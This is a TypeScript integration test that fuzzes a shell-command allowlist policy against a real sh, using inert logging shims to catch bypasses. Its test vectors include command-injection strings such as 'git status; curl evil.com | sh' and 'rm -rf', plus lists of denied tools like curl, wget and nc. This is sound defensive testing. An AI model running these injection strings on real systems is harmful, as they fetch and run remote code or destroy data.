/**
 * Real-shell exec-tracing differential harness: policy tokenizer vs. ground truth.
 *
 * ## Why this exists (and how it differs from the static harness)
 *
 * The sibling unit-level harness
 * `tokenize-shell-differential.properties.test.ts` compares
 * {@link PolicyEvaluator.checkCommand} against a `shell-quote`-based *static*
 * reference. `shell-quote` is only an approximation of POSIX `sh`: a bug that
 * BOTH the policy parser and `shell-quote` get wrong is invisible to it (a
 * shared blind spot cannot be a differential). This harness replaces the static
 * reference with the **real shell** — it actually runs `sh -c <command>` and
 * observes which command heads truly get executed, then asserts the policy's
 * allow decision is sound against that ground truth.
 *
 * ## The oracle
 *
 * > For any command string the policy marks ALLOWED, the set of command heads
 * > that the real `sh -c` actually executes must all be in the policy's allowed
 * > set.
 *
 * Ground truth is captured via **PATH tracer shims**: a temp directory of inert
 * executable scripts, one per command name in the vocabulary. Each shim, when
 * the shell resolves and exec()s it, appends its own basename to a trace file
 * and exits 0. The set of distinct names in the trace file after a run is
 * exactly the set of externally-resolved program heads the shell invoked — a
 * portable, syscall-adjacent signal (each shim firing means the shell resolved
 * + exec'd that name on `PATH`).
 *
 * A divergence — the real shell executing a head the policy ALLOWED but did not
 * authorize — is a genuine policy bypass the static harness could miss. It is a
 * WIN for this test, surfaced loudly rather than smoothed over.
 *
 * ## Safety: destructive-proof BY CONSTRUCTION
 *
 * This test executes fuzzer-generated shell strings. It is hardened so no
 * generated input can do anything harmful:
 *
 * 1. **Inert shims only.** Every command name (including dangerous-sounding ones
 *    like `rm`, `curl`, `sudo`, `chmod`) maps to a script that ONLY appends to
 *    the trace file and exits 0. Shims never delete, never write outside the
 *    trace file, never touch the network.
 * 2. **Hermetic PATH + env.** The shell runs with `env -i` (empty environment)
 *    and `PATH` set to ONLY the shim dir (plus `RD_TRACE_FILE`). Bare command
 *    names resolve EXCLUSIVELY to inert shims; there is no real `rm`/`curl`/etc.
 *    reachable by name. (Proven by hand: `rm -rf .` under this env deletes
 *    nothing — it resolves to the inert `rm` shim.)
 * 3. **Bare command names only.** The generator never emits absolute paths or
 *    `/bin/...` in command-head position (an absolute path would bypass the
 *    shims), and never redirects to an absolute path. Inputs containing `/` in a
 *    head-shaped position are filtered out of the fuzz stream before execution.
 * 4. **Throwaway cwd.** Each run executes in a fresh `mkdtemp` directory deleted
 *    afterward. Any stray file a relative redirection creates lands there and is
 *    cleaned up.
 * 5. **Timeout + no stdin.** The shell is spawned with a short timeout and
 *    `stdio: ['ignore', ...]` so a hang or a shim-less builtin loop cannot wedge
 *    the suite.
 * 6. **Defense in depth (optional).** On macOS `sandbox-exec` is available and
 *    could wrap the `sh` invocation, but the shim + `env -i` + temp-cwd design
 *    stands on its own without it, so the harness does not depend on a platform
 *    sandbox. The hermetic PATH is the load-bearing control: even a perfectly
 *    crafted injection can only reach inert shims.
 *
 * ## Conventions
 *
 * Named `.integration.test.ts` because it spawns real processes and is slower
 * than a unit test. `packages/core`'s package.json separates it from the fast
 * unit run via `--testPathIgnorePatterns='integration'` (test:unit) and runs it
 * via `--testPathPatterns='integration'` (test:integration), mirroring the CLI
 * package convention. Uses a modest fuzz count plus the curated classic-injection
 * vectors from the static harness as deterministic regression cases. The allow
 * set is intentionally tiny (`git`, `echo`) with `mode: 'deny'`.
 *
 * @module
 */

import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { spawnSync } from 'node:child_process';
import fc from 'fast-check';
import { PolicyEvaluator } from '../../src/policy/evaluator.js';
import { DEFAULT_POLICY, type PolicyConfig } from '../../src/policy/schema.js';
import { getErrorMessage, isNodeError } from '../../src/index.js';

const repoRoot = '/test/repo';

/** Executables the harness policy will allow. Everything else is denied. */
const ALLOWED = ['git', 'echo'] as const;

/**
 * The full shim vocabulary. Deliberately includes dangerous-sounding names so
 * the fuzzer can *try* to invoke them and the harness proves they are caught:
 * every one of these resolves to an inert trace-only script, so even a
 * successful "injection" runs nothing but a logger.
 */
const SHIM_NAMES = [
  // allowed heads
  'git',
  'echo',
  // denied heads the fuzzer tries to smuggle
  'curl',
  'wget',
  'rm',
  'sh',
  'bash',
  'cat',
  'nc',
  'sudo',
  'chmod',
  'python',
  'perl',
  'env',
  'cp',
  'mv',
  'ls',
  'true',
  'false',
] as const;

/** Hard timeout for each real `sh -c` spawn. */
const SHELL_TIMEOUT_MS = 2000;

/** Fuzz iteration count — real process spawns are slow, so keep this modest. */
const FUZZ_RUNS = 150;

/**
 * Build a deny-mode policy whose run allowlist is exactly the given names.
 *
 * @param allow - Executable names to allow (exact glob entries)
 * @returns A policy config with `mode: 'deny'` and the given run allowlist
 */
const denyRunPolicy = (allow: readonly string[]): PolicyConfig => ({
  ...DEFAULT_POLICY,
  default: {
    ...DEFAULT_POLICY.default,
    mode: 'deny',
    run: { allow: [...allow], deny: [] },
  },
});

// ---------------------------------------------------------------------------
// Hermetic shim sandbox
// ---------------------------------------------------------------------------

/**
 * A hermetic shim environment: a temp dir of inert tracer shims plus the
 * machinery to run a command under it and read back the executed heads.
 */
interface ShimSandbox {
  /** Directory containing the inert shim executables (the sole `PATH` entry). */
  readonly shimDir: string;
  /** Root temp dir holding the shims, trace file, and throwaway cwd. */
  readonly root: string;
  /** Delete the entire sandbox (shims, traces, cwds). */
  cleanup(): void;
}

/**
 * Create the hermetic shim sandbox: one inert tracer script per
 * {@link SHIM_NAMES} entry.
 *
 * Each shim writes ONLY its own (generation-time hardcoded) basename to the
 * trace file named by `$RD_TRACE_FILE`, using the shell builtin `printf` so it
 * needs no external command (important: under `env -i` the only thing on `PATH`
 * is the shim dir itself, so `basename`/`echo`-as-program would not resolve).
 * It then exits 0. It never deletes, writes elsewhere, or networks.
 *
 * @returns The sandbox handle (shim dir + cleanup)
 * @throws If the temp dir or shim scripts cannot be created
 */
function createShimSandbox(): ShimSandbox {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'rd-exec-diff-'));
  const shimDir = path.join(root, 'shims');
  fs.mkdirSync(shimDir);

  for (const name of SHIM_NAMES) {
    const shimPath = path.join(shimDir, name);
    // The basename is embedded as a single-quoted literal so no generated
    // argument can influence what is recorded. Pure shell builtins only.
    const script = `#!/bin/sh\nprintf '%s\\n' '${name}' >> "$RD_TRACE_FILE"\nexit 0\n`;
    fs.writeFileSync(shimPath, script, { mode: 0o755 });
  }

  return {
    shimDir,
    root,
    cleanup(): void {
      fs.rmSync(root, { recursive: true, force: true });
    },
  };
}

/** Outcome of executing one command under the hermetic shim sandbox. */
interface ExecTrace {
  /** Distinct command-head basenames the real shell actually exec'd. */
  heads: Set<string>;
  /** Whether the shell process timed out (trace is still authoritative for what ran before). */
  timedOut: boolean;
}

/**
 * Run a single command string under `sh -c` in the hermetic sandbox and return
 * the set of command heads the shell actually executed.
 *
 * Hermeticity controls applied here:
 * - `env -i`-equivalent: the spawned `sh` receives ONLY `PATH=<shimDir>` and
 *   `RD_TRACE_FILE` (we set `env` explicitly and do not inherit `process.env`).
 * - Fresh `mkdtemp` cwd, deleted after the run, so relative redirects are inert.
 * - `stdio: ['ignore','ignore','ignore']` and a {@link SHELL_TIMEOUT_MS} timeout
 *   so no input can wedge or block the suite.
 *
 * @param sandbox - The hermetic shim sandbox
 * @param command - The raw command string to execute
 * @returns The executed-head set and whether the shell timed out
 * @throws If the throwaway cwd cannot be created or the trace file cannot be read
 */
function runInSandbox(sandbox: ShimSandbox, command: string): ExecTrace {
  const runCwd = fs.mkdtempSync(path.join(sandbox.root, 'cwd-'));
  const traceFile = path.join(runCwd, '.rd-trace');
  fs.writeFileSync(traceFile, '');

  try {
    const result = spawnSync('/bin/sh', ['-c', command], {
      cwd: runCwd,
      // Hermetic env: no inheritance from process.env. Only the shim PATH and
      // the trace-file pointer. Equivalent to `env -i PATH=... RD_TRACE_FILE=...`.
      env: { PATH: sandbox.shimDir, RD_TRACE_FILE: traceFile },
      stdio: ['ignore', 'ignore', 'ignore'],
      timeout: SHELL_TIMEOUT_MS,
      killSignal: 'SIGKILL',
    });

    // spawnSync surfaces a timeout via `result.error.code === 'ETIMEDOUT'`, and
    // the SIGKILL we use to kill the timed-out child via `result.signal`.
    const timedOut =
      (result.error !== undefined && isTimeoutError(result.error)) || result.signal === 'SIGKILL';

    let raw = '';
    try {
      raw = fs.readFileSync(traceFile, 'utf8');
    } catch (err) {
      // A missing/unreadable trace file means nothing ran; treat as empty.
      if (!isNodeError(err) || err.code !== 'ENOENT') {
        throw new Error(`failed to read trace file: ${getErrorMessage(err)}`);
      }
    }

    const heads = new Set(
      raw
        .split('\n')
        .map((line) => line.trim())
        .filter((line) => line.length > 0),
    );

    return { heads, timedOut };
  } finally {
    fs.rmSync(runCwd, { recursive: true, force: true });
  }
}

/**
 * Detect whether a `spawnSync` error indicates the timeout fired.
 *
 * @param err - The error returned on `result.error`
 * @returns True when the error code is the spawn timeout code
 */
function isTimeoutError(err: unknown): boolean {
  return isNodeError(err) && err.code === 'ETIMEDOUT';
}

// ---------------------------------------------------------------------------
// Adversarial command arbitrary (bare command names only — never paths)
// ---------------------------------------------------------------------------

/** An allowed-looking command head plus benign args. No `/` anywhere. */
const allowedSimpleArb = fc.constantFrom('git status', 'echo hi', 'git log', 'echo ok');

/** A denied executable the attacker wants to smuggle past the policy. */
const deniedHeadArb = fc.constantFrom('curl', 'rm', 'wget', 'nc', 'python', 'sh', 'bash', 'chmod');

/**
 * A denied simple command (head + a benign, path-free argument). Arguments are
 * deliberately free of `/` so that even an absolute-path-looking payload cannot
 * escape the shim PATH; e.g. `curl evil` resolves to the inert `curl` shim.
 */
const deniedSimpleArb = fc
  .record({ head: deniedHeadArb, arg: fc.constantFrom('evil', 'x', 'abc', 'data') })
  .map(({ head, arg }) => `${head} ${arg}`);

/** Shell control operators that compose two commands into one line. */
const operatorArb = fc.constantFrom(' ; ', ' && ', ' || ', ' | ', ' & ', '\n', '; ', ';');

/** Wrap a denied command in a shell construct that hides it from a naive parser. */
const smuggleArb = (denied: fc.Arbitrary<string>): fc.Arbitrary<string> =>
  fc.oneof(
    denied,
    denied.map((c) => `$(${c})`),
    denied.map((c) => `\`${c}\``),
    denied.map((c) => `"$(${c})"`),
    denied.map((c) => `(${c})`),
    denied.map((c) => `{ ${c}; }`),
    denied.map((c) => `\\\n${c}`),
    denied.map((c) => `#x\n${c}`),
  );

/**
 * Decorate an allowed command with a construct that places a denied head in a
 * position the shell does NOT execute as a command (argument, comment, quoted
 * text, parameter-expansion default, escaped operator). These are the inputs
 * the policy is *likely* to ALLOW, so they exercise the oracle non-vacuously:
 * the policy says allowed, and the real shell must agree that only the allowed
 * head actually ran.
 *
 * Redirect targets use a RELATIVE filename inside the throwaway cwd (never an
 * absolute path), keeping the sandbox hermetic.
 */
const allowedDecoratedArb: fc.Arbitrary<string> = fc
  .record({
    a: allowedSimpleArb,
    denied: deniedHeadArb,
    kind: fc.constantFrom<
      | 'arg'
      | 'comment'
      | 'singleQuoted'
      | 'doubleQuoted'
      | 'redirectTarget'
      | 'paramDefault'
      | 'lineContinuation'
      | 'escapedSemicolon'
      | 'escapedAmp'
      | 'fdRedirect'
      | 'tabSep'
      | 'arithmetic'
    >(
      'arg',
      'comment',
      'singleQuoted',
      'doubleQuoted',
      'redirectTarget',
      'paramDefault',
      'lineContinuation',
      'escapedSemicolon',
      'escapedAmp',
      'fdRedirect',
      'tabSep',
      'arithmetic',
    ),
  })
  .map(({ a, denied, kind }) => {
    switch (kind) {
      case 'arg':
        return `${a} ${denied}`;
      case 'comment':
        return `${a} #${denied} evil`;
      case 'singleQuoted':
        return `${a} '; ${denied} evil'`;
      case 'doubleQuoted':
        return `${a} "; ${denied} evil"`;
      case 'redirectTarget':
        // Relative target inside the throwaway cwd — never an absolute path.
        return `${a} > out_${denied}`;
      case 'paramDefault':
        return `${a} \${x:-${denied}}`;
      case 'lineContinuation':
        return `${a} \\\n${denied}`;
      case 'escapedSemicolon':
        return `${a} \\; ${denied}`;
      case 'escapedAmp':
        return `${a} \\&\\& ${denied}`;
      case 'fdRedirect':
        return `${a} 2>&1 ${denied}`;
      case 'tabSep':
        return `${a}\t${denied}`;
      case 'arithmetic':
        return `${a} $(( 1 + 1 )) ${denied}`;
      default: {
        const _exhaustive: never = kind;
        return _exhaustive;
      }
    }
  });

/**
 * Build adversarial command strings spanning the allowed-decorated class (which
 * exercises the invariant), the smuggle class (which pins that obvious
 * injections are denied), and free-form metacharacter noise. The free-form
 * stream excludes `/` so it can never emit an absolute-path head that would
 * bypass the shims.
 */
const adversarialCommandArb: fc.Arbitrary<string> = fc.oneof(
  allowedDecoratedArb,
  allowedDecoratedArb,
  allowedDecoratedArb,
  fc
    .record({ a: allowedSimpleArb, op: operatorArb, d: smuggleArb(deniedSimpleArb) })
    .map(({ a, op, d }) => `${a}${op}${d}`),
  fc
    .record({ d: smuggleArb(deniedSimpleArb), op: operatorArb, a: allowedSimpleArb })
    .map(({ d, op, a }) => `${d}${op}${a}`),
  fc.record({ a: allowedSimpleArb, d: deniedSimpleArb }).map(({ a, d }) => `${a} $(${d})`),
  fc
    .record({
      a: allowedSimpleArb,
      op1: operatorArb,
      d: deniedSimpleArb,
      op2: operatorArb,
      a2: allowedSimpleArb,
    })
    .map(({ a, op1, d, op2, a2 }) => `${a}${op1}${d}${op2}${a2}`),
  // free-form: metacharacter soup WITHOUT '/' (no absolute-path heads).
  fc.stringMatching(/^[a-z;&|()$`{}<> \n#'"\\=-]{0,32}$/).filter((s) => s.trim().length > 0),
);

/**
 * Reject any command whose head position could contain a `/` (an absolute or
 * relative path that would resolve outside the shim dir). Bare-name heads only.
 *
 * This is a belt-and-braces guard on top of the generators (which already avoid
 * `/`): it filters any free-form input where a `/` immediately precedes or
 * follows a word boundary in a way that could form a path-shaped head.
 *
 * @param command - A generated command string
 * @returns True if the command is safe to execute (no path-shaped heads)
 */
function isPathFreeHead(command: string): boolean {
  // Conservative: forbid '/' entirely. None of the deliberate generators emit
  // it; only the free-form soup might, and a slash there is never needed to
  // exercise the tokenizer-vs-shell differential.
  return !command.includes('/');
}

// ---------------------------------------------------------------------------
// The differential oracle
// ---------------------------------------------------------------------------

/** A real policy bypass: the shell ran a head the policy allowed but did not authorize. */
interface Divergence {
  /** The minimal reproducing command. */
  command: string;
  /** The policy decision (always allowed for a divergence). */
  policyAllowed: boolean;
  /** Ground-truth heads the real shell executed. */
  shellHeads: string[];
  /** Executed heads that are NOT in the allowed set — the bypass. */
  unauthorized: string[];
}

/** Outcome of running the exec-tracing oracle on one command. */
interface OracleResult {
  /** Whether the policy evaluator allowed the command. */
  policyAllowed: boolean;
  /** The divergence (bypass) details, or `null` if the invariant held. */
  divergence: Divergence | null;
}

/**
 * Run the exec-tracing oracle on a single command string.
 *
 * Gets the policy decision from a deny-mode `{git, echo}` evaluator. If the
 * policy DENIES, no bypass is possible (the command never reaches `spawn`), so
 * the oracle returns immediately WITHOUT running the shell. If the policy
 * ALLOWS, the command is executed in the hermetic sandbox and every executed
 * head must be in the allowed set.
 *
 * @param sandbox - The hermetic shim sandbox
 * @param command - The candidate command
 * @returns The policy verdict and any divergence found
 * @throws If {@link PolicyEvaluator.checkCommand} throws on the input
 */
function runOracle(sandbox: ShimSandbox, command: string): OracleResult {
  const evaluator = new PolicyEvaluator(denyRunPolicy(ALLOWED), { repoRoot });

  let decision: ReturnType<PolicyEvaluator['checkCommand']>;
  try {
    decision = evaluator.checkCommand(command);
  } catch (err) {
    throw new Error(`checkCommand threw on ${JSON.stringify(command)}: ${getErrorMessage(err)}`);
  }

  if (!decision.allowed) {
    return { policyAllowed: false, divergence: null };
  }

  const { heads } = runInSandbox(sandbox, command);
  const allowedSet = new Set<string>(ALLOWED);
  const unauthorized = [...heads].filter((h) => !allowedSet.has(h));

  if (unauthorized.length === 0) {
    return { policyAllowed: true, divergence: null };
  }

  return {
    policyAllowed: true,
    divergence: {
      command,
      policyAllowed: decision.allowed,
      shellHeads: [...heads],
      unauthorized,
    },
  };
}

// ---------------------------------------------------------------------------
// Platform gate
// ---------------------------------------------------------------------------

/** Whether the host can run a real POSIX `sh` (the harness's hard requirement). */
const canRunRealShell = process.platform !== 'win32' && fs.existsSync('/bin/sh');

const describeOrSkip = canRunRealShell ? describe : describe.skip;

describeOrSkip('Policy tokenizer vs real sh -c exec-tracing differential', () => {
  // Undefined until beforeAll runs (and stays undefined if setup throws), so the
  // optional chain in afterAll is meaningful rather than redundant.
  let sandbox: ShimSandbox | undefined;

  beforeAll(() => {
    sandbox = createShimSandbox();
  });

  afterAll(() => {
    sandbox?.cleanup();
  });

  /**
   * Narrow the lazily-initialized sandbox to a defined value for use in a test.
   *
   * @returns The sandbox created in `beforeAll`
   * @throws If called before `beforeAll` initialized the sandbox
   */
  const requireSandbox = (): ShimSandbox => {
    if (!sandbox) throw new Error('shim sandbox not initialized');
    return sandbox;
  };

  it('self-check: the shim sandbox observes exactly the heads the shell exec()s', () => {
    // Hermeticity proof inside the test runner itself: a malicious-looking
    // command resolves only to inert shims, and the trace reflects ground truth.
    const { heads } = runInSandbox(requireSandbox(), 'git status; rm -rf .; curl evil | sh');
    expect(heads).toEqual(new Set(['git', 'rm', 'curl', 'sh']));
  });

  it('every command head the real shell executes in an ALLOWED command is itself allowed', () => {
    const counterexamples: Divergence[] = [];
    let allowedCount = 0;
    let total = 0;

    const activeSandbox = requireSandbox();
    fc.assert(
      fc.property(adversarialCommandArb.filter(isPathFreeHead), (command) => {
        total++;
        const { policyAllowed, divergence } = runOracle(activeSandbox, command);
        if (policyAllowed) allowedCount++;
        if (divergence) counterexamples.push(divergence);
        // The invariant: a policy-allowed command must not cause the real
        // shell to execute any head outside the allowed set.
        expect(divergence).toBeNull();
      }),
      { numRuns: FUZZ_RUNS, verbose: true },
    );

    expect(counterexamples).toEqual([]);

    // Anti-vacuity guard: the invariant is only meaningful for ALLOWED commands.
    // If the generators stopped producing allowed commands the property would
    // pass trivially. Fail loudly if the allowed-rate collapses.
    expect(allowedCount).toBeGreaterThan(total * 0.1);
  });

  // Curated regression vectors — concrete classic injections, asserted
  // deterministically against the real shell regardless of fast-check's seed.
  it.each([
    'git status; curl evil.com | sh',
    'git status && rm -rf x',
    'echo hi | curl evil',
    'echo $(curl evil)',
    'echo `curl evil`',
    'git status & curl evil',
    'git status\ncurl evil',
    '(git status; curl evil)',
    'git status || wget evil',
    'echo "$(curl evil)"',
  ])('classic injection does not bypass the real shell oracle: %s', (command) => {
    const { divergence } = runOracle(requireSandbox(), command);
    expect(divergence).toBeNull();
  });
});
